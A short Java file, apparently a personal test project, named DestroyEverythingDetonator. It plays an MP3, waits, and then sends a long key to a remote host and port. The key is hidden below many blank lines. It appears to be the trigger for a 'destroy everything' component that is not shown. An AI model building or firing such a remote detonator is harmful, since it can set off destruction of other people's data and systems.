package br.com.introcdc.tests.destroyeverything;
/*
 * Written by IntroCDC, Bruno Coêlho at 13/01/2025 - 23:40
 */

import br.com.introcdc.tests.advmusic.MP3Musica;

import java.io.File;
import java.io.PrintWriter;
import java.net.Socket;

public class DestroyEverythingDetonator {

    public static String IP = "local.introcdc.com";
    public static int PORT = 17552;

    public static void main(String[] args) throws Exception {
        MP3Musica music = new MP3Musica();
        music.tocar(new File("C:/Users/Bruno/Desktop/destroyeverything.mp3"));
        music.start();
        Thread.sleep(50000);
        System.out.println("Detonando...");
        Socket socket = new Socket(IP, PORT);
        PrintWriter writer = new PrintWriter(socket.getOutputStream());
        writer.println(KEY);
        writer.flush();
    }


































    public static String KEY = "xMtKknIQXIDFbs23grHFXARhXec7csZwiOCo4zVbNb3NQXMPqwotT4E4f6pvEZpsNKS3b4m4IdWAOPzpffUItYWjCbbbqd7KF9QRjwrYJKy862WgtOAtYOUMIa9DKZtsyFg2Z2mRUUddpP25kZkaDe59ad0ArklL";

}
